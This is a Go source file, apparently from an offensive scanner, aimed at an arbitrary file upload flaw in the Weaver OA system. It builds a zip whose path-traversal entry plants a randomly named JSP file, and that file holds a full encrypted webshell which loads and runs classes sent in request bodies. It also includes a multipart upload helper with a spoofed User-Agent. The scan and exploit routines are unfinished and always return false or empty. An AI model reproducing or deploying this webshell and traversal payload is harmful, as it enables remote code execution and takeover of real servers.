package vulners

import (
	"archive/zip"
	"bytes"
	"github.com/fatih/color"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

type Wc02 struct {
}

var (
	WebshellName string
)

func (s *Wc02) Scan(targetUrl string) {
	vulnerable, err := Wc02scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc02] 存在Weaver.common.Css 任意文件上传[数据包过于复杂还没写]")
	} else {
		color.White("[Wc02] 不存在Weaver.common.Css 任意文件上传[数据包过于复杂还没写]")
	}
}

func (*Wc02) Exploit(targetUrl string) {
	runResult, err := Wc02runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc02scancore(targetUrl string) (bool, error) {
	url := "/clusterupgrade/tokenCheck.jsp"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "key") {
		return false, nil
	} else {
		return false, nil
	}
}

func Wc02runcore(targetUrl string) (string, error) {
	zipFileName, err := createZip()
	if err != nil {
		color.Red("[x]zip文件创建失败！")
		return "", nil
	}
	zipFilePath := "./" + zipFileName
	color.Green("[+]zip文件创建成功，路径：" + zipFilePath)
	url := "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	r, err := regexp.Compile("key\":\"([\\s\\S]*?)\"}")
	if err != nil {
		return "", nil
	}
	result := strings.Replace(r.FindString(resContent), "\"", "", -1)
	result = strings.Replace(result, "}", "", -1)
	if strings.Contains(resContent, "key") {
		return "", nil
	} else {
		return "", nil
	}
}

func uploadZipFile(uri string, params map[string]string, paramName, path string, cookie string) (*http.Request, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	fileContents, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}
	fi, err := file.Stat()
	if err != nil {
		return nil, err
	}
	file.Close()

	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, fi.Name())
	if err != nil {
		return nil, err
	}
	part.Write(fileContents)

	for key, val := range params {
		_ = writer.WriteField(key, val)
	}
	err = writer.Close()
	if err != nil {
		return nil, err
	}
	request, err := http.NewRequest("POST", uri, body)
	request.Header.Add("Content-Type", writer.FormDataContentType())
	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	request.Header.Add("Cookie", cookie)
	return request, err
}

func RandStringRunes(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func createZip() (string, error) {
	shellData := "test<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"seeyoner\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>"
	WebshellName = RandStringRunes(10) + ".jsp"
	buf := new(bytes.Buffer)
	w := zip.NewWriter(buf)
	var files = []struct {
		Name, Body string
	}{
		{"../../../" + WebshellName, shellData},
	}
	for _, file := range files {
		f, err := w.Create(file.Name)
		if err != nil {
			return "", err
		}
		_, err = f.Write([]byte(file.Body))
		if err != nil {
			return "", err
		}
	}
	// 关闭压缩文档
	err := w.Close()
	if err != nil {
		return "", err
	}
	// 将压缩文档内容写入文件
	zipFileName := RandStringRunes(5) + ".zip"
	f, err := os.OpenFile(zipFileName, os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		return "", err
	}
	buf.WriteTo(f)
	return zipFileName, nil
}
